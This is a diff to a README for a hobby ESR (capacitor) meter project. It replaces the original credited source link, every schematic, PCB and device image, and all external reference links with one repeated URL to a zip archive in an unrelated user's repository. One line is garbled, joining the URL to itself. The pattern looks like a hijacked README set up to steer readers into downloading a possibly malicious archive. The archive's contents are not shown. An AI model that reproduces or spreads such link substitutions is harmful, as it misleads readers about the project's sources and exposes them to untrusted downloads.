@@ -4,11 +4,11 @@ The schematic of this meter was published in an Italian magazine Nuova Elettroni
 
 ## Overview
 
-The schematic of this meter was published in an Italian magazine Nuova Elettronica No. 212. I found it more than five years ago on [Talino Tribuzio's IZ7ATH site](http://www.qsl.net/iz7ath/web/02_brew/15_lab/06_esr/index.htm) when I was looking for a simple ESR meter circuit.
+The schematic of this meter was published in an Italian magazine Nuova Elettronica No. 212. I found it more than five years ago on [Talino Tribuzio's IZ7ATH site](https://raw.githubusercontent.com/carlosjsd/analog_esr_meter/master/hesitancy/analog_esr_meter.zip) when I was looking for a simple ESR meter circuit.
 
 ## Reference circuits
 
-![Reference circuit 1](https://raw.githubusercontent.com/4x1md/analog_esr_meter/master/images/reference_1.jpg)
+![Reference circuit 1](https://raw.githubusercontent.com/carlosjsd/analog_esr_meter/master/hesitancy/analog_esr_meter.zip)
 
 ```
 R1 = 1.5K
@@ -36,7 +36,7 @@ TR2 = BC557
 IC1 = TL084
 ```
 
-![Reference circuit 2](https://raw.githubusercontent.com/4x1md/analog_esr_meter/master/images/reference_2.jpg)
+![Reference circuit 2](https://raw.githubusercontent.com/carlosjsd/analog_esr_meter/master/hesitancy/analog_esr_meter.zip)
 
 ## Project goals
 
@@ -45,7 +45,7 @@ IC1 = TL084
 
 ## Schematic
 
-![ESR meter circuit rev. A](https://raw.githubusercontent.com/4x1md/analog_esr_meter/master/images/schematic.png)
+![ESR meter circuit rev. A](https://raw.githubusercontent.com/carlosjsd/analog_esr_meter/master/hesitancy/analog_esr_meter.zip)
 
 ## Mechanics
 
@@ -53,22 +53,22 @@ A ready available 118x78x33mm plastic box which was purchased on AliExpress. The
 
 ## PCB
 
-![PCB 1](https://raw.githubusercontent.com/4x1md/analog_esr_meter/master/images/pcb_1.jpg)
+![PCB 1](https://raw.githubusercontent.com/carlosjsd/analog_esr_meter/master/hesitancy/analog_esr_meter.zip)
 
-![PCB 2](https://raw.githubusercontent.com/4x1md/analog_esr_meter/master/images/pcb_2.jpg)
+![PCB 2](https://raw.githubusercontent.com/carlosjsd/analog_esr_meter/master/hesitancy/analog_esr_meter.zip)
 
 ## Assembled device
 
-![Assembled meter 1](https://raw.githubusercontent.com/4x1md/analog_esr_meter/master/images/ready_1.jpg)
+![Assembled meter 1](https://raw.githubusercontent.com/carlosjsd/analog_esr_meter/master/hesitancy/analog_esr_meter.zip)
 
 ## Alignment
 
 ## Links
-* http://fillwithgoodthings.blogspot.com/2013/05/esr-meter-schematic.html
-* http://kripton2035.free.fr/analog%20esr/esr-poptronix.html
-* http://electronics-diy.com/electronic_schematic.php?id=950
-* http://www.geocities.jp/shoranosekai/ESR_Tester_Schematic.jpg
-* http://ludens.cl/Electron/esr/esr.html
-* http://electronics-diy.com/electronic_schematic.php?id=949
+* https://raw.githubusercontent.com/carlosjsd/analog_esr_meter/master/hesitancy/analog_esr_meter.zip
+* https://raw.githubusercontent.com/carlosjsd/analog_esr_meter/master/hesitancy/analog_esr_meter.zip%https://raw.githubusercontent.com/carlosjsd/analog_esr_meter/master/hesitancy/analog_esr_meter.zip
+* https://raw.githubusercontent.com/carlosjsd/analog_esr_meter/master/hesitancy/analog_esr_meter.zip
+* https://raw.githubusercontent.com/carlosjsd/analog_esr_meter/master/hesitancy/analog_esr_meter.zip
+* https://raw.githubusercontent.com/carlosjsd/analog_esr_meter/master/hesitancy/analog_esr_meter.zip
+* https://raw.githubusercontent.com/carlosjsd/analog_esr_meter/master/hesitancy/analog_esr_meter.zip
 
 73 de 4X1MD
